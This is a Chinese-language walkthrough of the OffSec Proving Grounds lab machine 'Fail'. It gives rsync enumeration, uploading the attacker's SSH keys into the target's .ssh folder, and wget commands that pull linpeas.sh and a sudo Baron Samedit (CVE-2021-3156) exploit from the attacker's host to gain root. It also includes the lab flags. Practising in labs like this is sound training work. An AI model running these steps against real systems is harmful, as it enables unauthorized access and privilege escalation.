###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Fail
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.214.126 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.214.126:22
Open 192.168.214.126:873

PORT    STATE SERVICE REASON  VERSION
22/tcp  open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
873/tcp open  rsync   syn-ack (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

搜尋873port exploit可以找到[873 - Pentesting Rsync](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync#manual-rsync-usage)
照著他用先`Enumerating Shared Folders`，可得到fox，接著把kali的`public(authorized_keys)`送上去
```
┌──(kali㉿kali)-[~/pgplay]
└─$ nmap -sV --script "rsync-list-modules" -p 873 192.168.214.126
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 21:42 EDT
Nmap scan report for 192.168.214.126
Host is up (0.075s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  fox                 fox home

┌──(kali㉿kali)-[~/pgplay]
└─$ rsync -av /home/kali/.ssh/ rsync://fox@192.168.214.126/fox/.ssh/               
sending incremental file list
created directory /.ssh
./
authorized_keys
id_rsa
id_rsa.pub
known_hosts
known_hosts.old
```

可直接ssh，在`/home`資料夾可得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ssh fox@192.168.214.126

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
fox@fail:/home$ cat local.txt
842ed935009efc6b8f654b4371ef263f
```

用`linpeas.sh`
```
fox@fail:/tmp$ wget 192.168.45.211/linpeas.sh
fox@fail:/tmp$ chmod +x linpeas.sh
fox@fail:/tmp$ ./linpeas.sh

...
[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
...
```

用[CVE-2021-3156](https://github.com/worawit/CVE-2021-3156?tab=readme-ov-file)得root，在/root得proof.txt
```
fox@fail:/tmp$ wget 192.168.45.211/exploit_nss.py
fox@fail:/tmp$ python3 exploit_nss.py
# whoami
root
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@fail:/root# cat proof.txt
4ec72d37fba8632f5323def55814ad7b
```